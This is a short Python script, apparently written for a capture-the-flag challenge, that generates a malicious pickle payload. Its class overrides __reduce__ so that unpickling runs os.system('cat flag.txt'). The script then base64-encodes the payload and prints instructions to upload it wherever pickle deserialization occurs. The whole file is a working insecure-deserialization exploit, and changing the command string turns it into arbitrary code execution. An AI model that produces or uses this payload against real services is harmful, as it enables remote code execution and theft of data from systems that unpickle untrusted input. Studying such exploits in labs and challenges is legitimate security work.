import pickle
import os
import base64

# Generate malicious pickle payload to read the flag file
class Exploit:
    def __reduce__(self):
        # This will read flag.txt and print it to stdout
        import os
        return (os.system, ("cat flag.txt",))

# Create the pickle
exploit_pickle = pickle.dumps(Exploit(), protocol=2)

# Encode in base64 for easy transport/upload
exploit_b64 = base64.b64encode(exploit_pickle).decode('utf-8')

print("===Malicious Pickle Payload Generated===")
print(f"Raw size: {len(exploit_pickle)} bytes")
print(f"Base64 size: {len(exploit_b64)} characters")
print(f"Base64 payload:\n{exploit_b64}")
print("\n===Usage Instructions===")
print("Upload this base64-encoded payload where pickle deserialization occurs")
print("When unpickled, it will execute: cat flag.txt")
print("\n===Payload Preview (first 50 bytes in hex)===" )
print(exploit_pickle[:50].hex())
